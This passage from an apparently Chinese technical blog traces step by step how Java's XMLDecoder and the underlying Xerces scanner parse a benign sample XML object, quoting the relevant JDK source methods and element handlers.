class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// scanDocument(boolean):boolean</span></span><br></pre></td></tr></table></figure>

<p>跟进<code>next()</code>方法到<code>XMLDocumentScannerImpl$XMLDeclDriver#next()</code>，首先无论文档中是否有XML声明，下一个驱动器设置为<code>fPrologDriver</code>，因此下次进入<code>fDriver.next()</code>方法就在其他类中。即<code>PrologDriver</code>中的<code>next</code>方法。从当前内部类的类名可以大致理解，这是用来扫xml文档相关内容的，也就是xml文件第一句<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//XMLDocumentScannerImpl</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">next</span><span class="params">()</span> <span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line">    <span class="keyword">return</span> fDriver.next();</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//XMLDocumentScannerImpl$XMLDeclDriver</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">next</span><span class="params">()</span> <span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line">    <span class="keyword">if</span>(DEBUG_NEXT)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;NOW IN XMLDeclDriver&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// next driver is prolog regardless of whether there</span></span><br><span class="line">    <span class="comment">// is an XMLDecl in this document</span></span><br><span class="line">    setScannerState(SCANNER_STATE_PROLOG);</span><br><span class="line">    setDriver(fPrologDriver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//System.out.println(&quot;fEntityScanner = &quot; + fEntityScanner);</span></span><br><span class="line">    <span class="comment">// scan XMLDecl</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fEntityScanner.skipString(xmlDecl)) &#123;</span><br><span class="line">            fMarkupDepth++;</span><br><span class="line">            <span class="comment">// <span class="doctag">NOTE:</span> special case where document starts with a PI</span></span><br><span class="line">            <span class="comment">//       whose name starts with &quot;xml&quot; (e.g. &quot;xmlfoo&quot;)</span></span><br><span class="line">            <span class="keyword">if</span> (XMLChar.isName(fEntityScanner.peekChar())) &#123;</span><br><span class="line">                fStringBuffer.clear();</span><br><span class="line">                fStringBuffer.append(<span class="string">&quot;xml&quot;</span>);</span><br><span class="line">                <span class="keyword">while</span> (XMLChar.isName(fEntityScanner.peekChar())) &#123;</span><br><span class="line">                    fStringBuffer.append((<span class="type">char</span>)fEntityScanner.scanChar());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> fSymbolTable.addSymbol(fStringBuffer.ch, fStringBuffer.offset, fStringBuffer.length);</span><br><span class="line">                <span class="comment">//this function should fill the data.. and set the fEvent object to this event.</span></span><br><span class="line">                fContentBuffer.clear() ;</span><br><span class="line">                scanPIData(target, fContentBuffer);</span><br><span class="line">                <span class="comment">//REVISIT:where else we can set this value to &#x27;true&#x27;</span></span><br><span class="line">                fEntityManager.fCurrentEntity.mayReadChunks = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">//return PI event since PI was encountered</span></span><br><span class="line">                <span class="keyword">return</span> XMLEvent.PROCESSING_INSTRUCTION ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// standard XML declaration</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                scanXMLDeclOrTextDecl(<span class="literal">false</span>);</span><br><span class="line">                <span class="comment">//REVISIT:where else we can set this value to &#x27;true&#x27;</span></span><br><span class="line">                fEntityManager.fCurrentEntity.mayReadChunks = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> XMLEvent.START_DOCUMENT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//REVISIT:where else we can set this value to &#x27;true&#x27;</span></span><br><span class="line">            fEntityManager.fCurrentEntity.mayReadChunks = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//In both case return the START_DOCUMENT. ony difference is that first block will</span></span><br><span class="line">            <span class="comment">//cosume the XML declaration if any.</span></span><br><span class="line">            <span class="keyword">return</span> XMLEvent.START_DOCUMENT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//START_OF_THE_DOCUMENT</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// premature end of file</span></span><br><span class="line">    <span class="keyword">catch</span> (EOFException e) &#123;</span><br><span class="line">        reportFatalError(<span class="string">&quot;PrematureEOF&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//throw e;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/image-20240911104226797.png" alt="image-20240911104226797"></p>
<p>然后回到<code>scanDocument</code>方法做后续处理，这里没有处理直接<code>break</code>跳出<code>switch-catch</code>语句然后调用下一个驱动器<code>PrologDriver</code>的<code>next</code>方法。</p>
<p>这段代码比较长，我们根据处于的状态拆出对应的case代码来看。xml头在上一步已经解析了，所以这里我们要解析的部分是</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_65&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;MyObject&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">int</span>&gt;</span>123<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个解析过程是通过状态机完成的，每个状态代表解析过程中的一个特定阶段。我们来看代码是如何解析的。</p>
<p>首先，解析器在初始化时处于 <code>SCANNER_STATE_PROLOG</code> 状态。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SCANNER_STATE_PROLOG: &#123;</span><br><span class="line">    fEntityScanner.skipSpaces();</span><br><span class="line">    <span class="keyword">if</span> (fEntityScanner.skipChar(<span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_START_OF_MARKUP);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fEntityScanner.skipChar(<span class="string">&#x27;&amp;&#x27;</span>)) &#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_REFERENCE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_CONTENT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跳过空白字符后，遇到 <code>&lt;</code>，切换到 <code>SCANNER_STATE_START_OF_MARKUP</code> 状态。</li>
</ul>
<p>接下来，进入 <code>SCANNER_STATE_START_OF_MARKUP</code> 状态：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SCANNER_STATE_START_OF_MARKUP: &#123;</span><br><span class="line">    fMarkupDepth++;</span><br><span class="line">    <span class="keyword">if</span> (fEntityScanner.skipChar(<span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_PI);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fEntityScanner.skipChar(<span class="string">&#x27;!&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fEntityScanner.skipChar(<span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!fEntityScanner.skipChar(<span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                reportFatalError(<span class="string">&quot;InvalidCommentStart&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            setScannerState(SCANNER_STATE_COMMENT);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fEntityScanner.skipString(DOCTYPE)) &#123;</span><br><span class="line">            setScannerState(SCANNER_STATE_DOCTYPE);</span><br><span class="line">            <span class="type">Entity</span> <span class="variable">entity</span> <span class="operator">=</span> fEntityScanner.getCurrentEntity();</span><br><span class="line">            <span class="keyword">if</span>(entity <span class="keyword">instanceof</span> Entity.ScannedEntity)&#123;</span><br><span class="line">                fStartPos=((Entity.ScannedEntity)entity).position;</span><br><span class="line">            &#125;</span><br><span class="line">            fReadingDTD=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(fDTDDecl == <span class="literal">null</span>)</span><br><span class="line">                fDTDDecl = <span class="keyword">new</span> <span class="title class_">XMLStringBuffer</span>();</span><br><span class="line">            fDTDDecl.append(<span class="string">&quot;&lt;!DOCTYPE&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reportFatalError(<span class="string">&quot;MarkupNotRecognizedInProlog&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (XMLChar.isNameStart(fEntityScanner.peekChar())) &#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_ROOT_ELEMENT);</span><br><span class="line">        setDriver(fContentDriver);</span><br><span class="line">        <span class="keyword">return</span> fContentDriver.next();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reportFatalError(<span class="string">&quot;MarkupNotRecognizedInProlog&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>fMarkupDepth</code> 计数器(标签深度)增加。</li>
<li>检查是否遇到 <code>?</code>，如果是，则切换到 <code>SCANNER_STATE_PI</code> 状态。</li>
<li>检查是否遇到 <code>!</code>，处理注释 (<code>&lt;!--</code>) 或文档类型声明 (<code>&lt;!DOCTYPE</code>)。</li>
<li>检查是否为有效的XML名称字符（例如 <code>&lt;object&gt;</code>），如果是，则切换到 <code>SCANNER_STATE_ROOT_ELEMENT</code> 状态，并将驱动器切换为 <code>fContentDriver</code>。此时调用 <code>return fContentDriver.next();</code>。</li>
</ul>
<p>同样由于400行代码过长，只取需要的case块代码。</p>
<p>首先进入的SCANNER_STATE_ROOT_ELEMENT状态对应的处理逻辑。用<code>scanRootElementHook()</code> 方法扫描并处理 XML 文档的根元素。我们跟进去。然后调用了scanStartElement()方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SCANNER_STATE_ROOT_ELEMENT: &#123;</span><br><span class="line">    <span class="keyword">if</span> (scanRootElementHook()) &#123;</span><br><span class="line">        fEmptyElement = <span class="literal">true</span>;</span><br><span class="line">       	<span class="keyword">return</span> XMLEvent.START_ELEMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    setScannerState(SCANNER_STATE_CONTENT);</span><br><span class="line">    <span class="keyword">return</span> XMLEvent.START_ELEMENT ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">scanRootElementHook</span><span class="params">()</span></span><br><span class="line"><span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scanStartElement()) &#123;</span><br><span class="line">        setScannerState(SCANNER_STATE_TRAILING_MISC);</span><br><span class="line">        setDriver(fTrailingMiscDriver);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为 <code>&lt;java&gt;</code> 不是空元素，调用 <code>fDocumentHandler.startElement(fElementQName, fAttributes, null)</code> 通知文档处理器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">scanStartElement</span><span class="params">()</span></span><br><span class="line"><span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line"></span><br><span class="line">   	<span class="comment">// 跳过处理逻辑</span></span><br><span class="line">    <span class="keyword">if</span>(fSkip &amp;&amp; !fAdd)&#123;</span><br><span class="line">    	......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加元素逻辑</span></span><br><span class="line">    <span class="keyword">if</span>(!fSkip || fAdd)&#123;</span><br><span class="line">        <span class="comment">//get the next element from the stack</span></span><br><span class="line">        fElementQName = fElementStack.nextElement();</span><br><span class="line">        <span class="comment">// name</span></span><br><span class="line">        <span class="keyword">if</span> (fNamespaces) &#123;</span><br><span class="line">            fEntityScanner.scanQName(fElementQName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fEntityScanner.scanName();</span><br><span class="line">            fElementQName.setValues(<span class="literal">null</span>, name, name, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否需要跳过元素</span></span><br><span class="line">    <span class="keyword">if</span>(fAdd)&#123;......&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="comment">// 设置当前元素</span></span><br><span class="line">    fCurrentElement = fElementQName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">rawname</span> <span class="operator">=</span> fElementQName.rawname;</span><br><span class="line">    fEmptyElement = <span class="literal">false</span>;</span><br><span class="line">    fAttributes.removeAllAttributes();</span><br><span class="line"> <span class="comment">// 检查元素深度</span></span><br><span class="line">    checkDepth(rawname);</span><br><span class="line">     <span class="comment">// 解析属性</span></span><br><span class="line">    <span class="keyword">if</span>(!seekCloseOfStartTag())&#123;</span><br><span class="line">        fReadingAttributes = <span class="literal">true</span>;</span><br><span class="line">        fAttributeCacheUsedCount =<span class="number">0</span>;</span><br><span class="line">        fStringBufferIndex =<span class="number">0</span>;</span><br><span class="line">        fAddDefaultAttr = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            scanAttribute(fAttributes);</span><br><span class="line">            <span class="keyword">if</span> (fSecurityManager != <span class="literal">null</span> &amp;&amp; !fSecurityManager.isNoLimit(fElementAttributeLimit) &amp;&amp;</span><br><span class="line">                    fAttributes.getLength() &gt; fElementAttributeLimit)&#123;</span><br><span class="line">                fErrorReporter.reportError(XMLMessageFormatter.XML_DOMAIN,</span><br><span class="line">                                             <span class="string">&quot;ElementAttributeLimit&quot;</span>,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;rawname, fElementAttributeLimit &#125;,</span><br><span class="line">                                             XMLErrorReporter.SEVERITY_FATAL_ERROR );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> (!seekCloseOfStartTag());</span><br><span class="line">        fReadingAttributes=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 处理空元素</span></span><br><span class="line">    <span class="keyword">if</span> (fEmptyElement) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dtdGrammarUtil != <span class="literal">null</span>)</span><br><span class="line">            dtdGrammarUtil.startElement(fElementQName, fAttributes);</span><br><span class="line">        <span class="keyword">if</span>(fDocumentHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//complete element and attributes are traversed in this function so we can send a callback</span></span><br><span class="line">            <span class="comment">//here.</span></span><br><span class="line">            <span class="comment">//&lt;strong&gt;we shouldn&#x27;t be sending callback in scanDocument()&lt;/strong&gt;</span></span><br><span class="line">            fDocumentHandler.startElement(fElementQName, fAttributes, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳过几个重载的来到<code>DocumentHandler#startElement()</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">    <span class="type">ElementHandler</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.handler;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handler = getElementHandler(qName).newInstance();</span><br><span class="line">        <span class="built_in">this</span>.handler.setOwner(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.handler.setParent(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SAXException</span>(exception);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; attributes.getLength(); i++)</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> attributes.getQName(i);</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> attributes.getValue(i);</span><br><span class="line">            <span class="built_in">this</span>.handler.addAttribute(name, value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (RuntimeException exception) &#123;</span><br><span class="line">            handleException(exception);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.handler.startElement();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当前处理的是<java version="1.8.0_65" class="java.beans.XMLDecoder">，所以现在要实例化一个处理java标签的处理器，<code>JavaElementHandler</code>。然后设置这个handler的所有者和父级。</p>
<p><img src="/./images/image-20240912023839928.png" alt="image-20240912023839928"></p>
<p>接着遍历元素的属性并调用 <code>this.handler.addAttribute(name, value);</code> 将属性添加到当前的 <code>ElementHandler</code> 实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String name, String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.equals(<span class="string">&quot;version&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="comment">// unsupported attribute</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;class&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="comment">// check class for owner</span></span><br><span class="line">        <span class="built_in">this</span>.type = getOwner().findClass(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.addAttribute(name, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后回到<code>DocumentHandler#startElement()</code>方法，还有最后一句代码<code>this.handler.startElement();</code>需要执行。调用<code>JavaElementHandler#startElement()</code>。<code>JavaElementHandler</code>没有这个方法，父类该方法也为空。那就不管</p>
<p>处理完java标签后，我们的下一个标签    <object class="MyObject">也是类似的过程。来到该方法后。</p>
<p>实例化<code>ObjectElementHandler</code>处理器。然后获取属性和值用<code>ObjectElementHandler#addAttribute</code>方法添加。不过这里处理器中没有对应的属性可以设置，所以调用父类的方法<code>NewElementHandler#addAttribute</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ObjectElementHandler#addAttribute</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String name, String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.equals(<span class="string">&quot;idref&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.idref = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;field&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.field = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;index&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.index = Integer.valueOf(value);</span><br><span class="line">        addArgument(<span class="built_in">this</span>.index); <span class="comment">// hack for compatibility</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;property&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.property = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;method&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.method = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.addAttribute(name, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//NewElementHandler#addAttribute</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String name, String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.equals(<span class="string">&quot;class&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.type = getOwner().findClass(value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.addAttribute(name, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后回到<code>DocumentHandler#startElement()</code>去执行最后一句代码，调用了<code>ObjectElementHandler.startElement()</code>，由于<code>field</code>与<code>idref</code>都是null，不会进入if语句调用<code>getValueObject()</code>方法。</p>
